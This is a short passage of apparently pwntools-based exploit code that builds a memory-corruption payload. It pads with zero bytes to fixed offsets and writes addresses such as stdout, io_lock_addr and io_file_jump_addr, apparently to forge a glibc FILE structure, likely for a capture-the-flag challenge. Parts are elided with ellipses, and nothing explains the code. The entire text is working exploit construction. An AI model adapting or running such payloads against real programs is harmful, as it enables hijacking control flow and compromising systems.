...
payload = p8(0)*0x1b8
payload += p64(sysmem)
payload += p8(0)*(0x2a0-len(payload))
payload += p64(nl_clctype_class_addr)
payload += p8(0)*(0x438-len(payload))
payload += p64(stdout)
payload += p8(0)*(0x4a8-len(payload))
payload += p32(0x1)
payload += p8(0)*(0x4c0-len(payload))
payload += p64(io_lock_addr)
payload += p8(0)*(0x510-len(payload))
payload += p64(io_file_jump_addr)
payload += p8(0)*(0x520-len(payload))
...
payload += p8(0)*(0x980-len(payload))
